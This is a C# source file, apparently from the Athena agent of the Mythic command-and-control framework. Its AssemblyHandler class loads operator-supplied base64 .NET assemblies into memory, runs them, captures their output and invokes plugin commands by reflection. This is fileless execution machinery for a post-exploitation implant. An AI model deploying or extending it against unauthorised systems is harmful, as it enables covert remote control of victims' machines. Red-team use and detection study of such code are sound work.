using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Models.Athena.Assembly;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Threading.Tasks;
using PluginBase;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        private AssemblyLoadContext commandContext { get; set; }
        private ExecuteAssemblyContext executeAssemblyContext { get; set; }
        private ConcurrentDictionary<string, Assembly> loadedCommands { get; set; }
        public bool assemblyIsRunning { get; set; }
        public string assemblyTaskId { get; set; }
        private StringWriter executeAssemblyWriter { get; set; }
        public AssemblyHandler()
        {
            this.commandContext = new AssemblyLoadContext("athcmd");
            this.executeAssemblyContext = new ExecuteAssemblyContext();
            this.loadedCommands = new ConcurrentDictionary<string, Assembly>();
        }
        /// <summary>
        /// Load an assembly into our execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<ResponseResult> LoadAssemblyAsync(MythicJob job)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
            try
            {
                if(la.target == "plugin")
                {
                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                }
                else if(la.target == "external")
                {
                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                }
                else
                {
                    return new ResponseResult
                    {
                        task_id = job.task.id,
                        user_output = "Invalid target specified",
                        completed = "true",
                        status = "error"
                    };
                }
                //Return true if success
                return new ResponseResult
                {
                    task_id = job.task.id,
                    user_output = "Successfully loaded assembly",
                    completed = "true"
                };

            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    user_output = e.Message,
                    completed = "true",
                    status = "error"
                };
            }
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        public async Task<ResponseResult> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            //Backup the original StdOut
            var origStdOut = Console.Out;
            if (assemblyIsRunning)
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "An assembly is already executing.!",
                    task_id = job.task.id,
                };
            }

            ExecuteAssemblyTask ea = JsonConvert.DeserializeObject<ExecuteAssemblyTask>(job.task.parameters);
            
            //Indicating an execute-assembly task is running.
            this.assemblyIsRunning = true;
            this.assemblyTaskId = job.task.id;

            //Add an alert for when the assembly is finished executing
            try
            {
                using(this.executeAssemblyWriter = new StringWriter())
                {   
                    //Capture StdOut
                    Console.SetOut(this.executeAssemblyWriter);

                    //Load the Assembly
                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));

                    //Invoke the Assembly
                    assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished

                    //Return StdOut back to original location
                    Console.SetOut(origStdOut);
                }

                this.assemblyIsRunning = false;

                ResponseResult result = await this.GetAssemblyOutput();
                result.user_output += Environment.NewLine + "Finished Executing.";

                return result;

                //Maybe set an event that the execution is finished?
            }
            catch (Exception e)
            {
                this.assemblyIsRunning = false;
                return new ResponseResult
                {
                    completed = "true",
                    user_output = this.GetAssemblyOutput() + Environment.NewLine + e + Environment.NewLine + e.ToString(),
                    task_id = job.task.id,
                    status = "error"
                };
            }
        }
        /// <summary>
        /// Get output from the currently running assembly
        /// </summary>
        public async Task<ResponseResult> GetAssemblyOutput()
        {
            await this.executeAssemblyWriter.FlushAsync();
            string output = this.executeAssemblyWriter.GetStringBuilder().ToString();

            //Clear the writer
            this.executeAssemblyWriter.GetStringBuilder().Clear();
            
            return new ResponseResult
            {
                user_output = output,
                task_id = this.assemblyTaskId,
                completed = (!this.assemblyIsRunning).ToString()
            };
        }
        /// <summary>
        /// Clear the execution context of any loaded assemblies
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<ResponseResult> ClearAssemblyLoadContext(MythicJob job)
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                this.executeAssemblyContext.Unload();
                this.executeAssemblyContext = new ExecuteAssemblyContext();
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = "true",
                    user_output = "AssemblyLoadContext reset."
                };
            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = "true",
                    user_output = e.Message,
                    status = "error"
                };
            }
        }
        /// <summary>
        /// Load a command into the command execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<LoadCommandResponseResult> LoadCommandAsync(MythicJob job)
        {
            LoadCommand command = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);

            try
            {
                var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm))));
                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Command loaded!",
                    task_id = job.task.id,
                    commands = new List<CommandsResponse>()
                        {
                            new CommandsResponse()
                            {
                                action = "add",
                                cmd = command.command,
                            }
                        }
                };
            }
            catch (Exception e)
            {
                return new LoadCommandResponseResult()
                {
                    completed = "true",
                    user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                };

            }
        }
        /// <summary>
        /// Run a previously loaded command
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<object> RunLoadedCommand(MythicJob job)
        {
            try
            {
                Type t = this.loadedCommands[job.task.command].GetType($"Plugin.{job.task.command.Replace("-",String.Empty)}");
                var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string, object>) });
                Dictionary<string, object> parameters = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string,object>();
                parameters.Add("task-id", job.task.id);

                return methodInfo.Invoke(null, new object[] { parameters });
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
                    completed = "true",
                    status = "error",
                    task_id = job.task.id,
                };
            }
        }
        /// <summary>
        /// Check to see if a command is already loaded
        /// </summary>
        /// <param name="command">Event Sender</param>
        public async Task<bool> CommandIsLoaded(string command)
        {
            return this.loadedCommands.ContainsKey(command);
        }
    }
}
